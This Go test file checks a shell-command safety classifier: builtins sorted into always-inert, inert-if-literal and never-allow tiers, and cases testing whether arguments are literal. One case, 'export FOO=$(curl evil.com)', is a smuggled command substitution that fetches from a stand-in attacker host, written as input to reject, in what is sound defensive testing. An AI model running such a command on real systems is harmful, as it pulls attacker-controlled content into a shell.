package parser

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestClassifyBuiltin(t *testing.T) {
	tests := []struct {
		name string
		want SafetyTier
	}{
		{"true", TierAlwaysInert},
		{"false", TierAlwaysInert},
		{":", TierAlwaysInert},
		{"test", TierAlwaysInert},
		{"[", TierAlwaysInert},
		{"[[", TierAlwaysInert},
		{"echo", TierInertIfLiteral},
		{"printf", TierInertIfLiteral},
		{"cd", TierInertIfLiteral},
		{"pwd", TierInertIfLiteral},
		{"exit", TierInertIfLiteral},
		{"return", TierInertIfLiteral},
		{"shift", TierInertIfLiteral},
		{"unset", TierInertIfLiteral},
		{"ls", TierAlwaysInert},
		{"date", TierAlwaysInert},
		{"whoami", TierAlwaysInert},
		{"read", TierInertIfLiteral},
		{"alias", TierNeverAllow},
		{"unalias", TierNeverAllow},
		{"let", TierNeverAllow},
		{"builtin", TierNeverAllow},
		{"source", TierNeverAllow},
		{".", TierNeverAllow},
		{"eval", TierNeverAllow},
		{"exec", TierNeverAllow},
		{"set", TierNeverAllow},
		{"trap", TierNeverAllow},
		{"git", TierNotBuiltin},
		{"curl", TierNotBuiltin},
		{"rm", TierNotBuiltin},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := ClassifyBuiltin(tt.name)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestArgsAreLiteral(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    bool
	}{
		{
			name:    "plain echo",
			command: "echo hello world",
			want:    true,
		},
		{
			name:    "echo with variable",
			command: `echo $HOME`,
			want:    true, // ParamExp is fine in arguments
		},
		{
			name:    "echo with command substitution",
			command: "echo $(whoami)",
			want:    false,
		},
		{
			name:    "echo with process substitution",
			command: "echo <(ls)",
			want:    false,
		},
		{
			name:    "echo with double-quoted variable",
			command: `echo "$HOME"`,
			want:    true,
		},
		{
			name:    "echo with double-quoted command subst",
			command: `echo "$(whoami)"`,
			want:    false,
		},
		{
			name:    "cd with literal path",
			command: "cd /tmp/safe",
			want:    true,
		},
		{
			name:    "printf with literal args",
			command: `printf "%s\n" hello`,
			want:    true,
		},
		{
			name:    "echo with arithmetic",
			command: "echo $((1+2))",
			want:    true, // arithmetic is safe
		},
		{
			name:    "export literal",
			command: "export FOO=bar",
			want:    true,
		},
		{
			name:    "export with command subst",
			command: "export FOO=$(curl evil.com)",
			want:    false,
		},
		{
			name:    "single-quoted arg",
			command: "echo 'hello world'",
			want:    true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ArgsAreLiteral(tt.command)
			if err != nil {
				t.Fatalf("unexpected parse error: %v", err)
			}
			assert.Equal(t, tt.want, got)
		})
	}
}
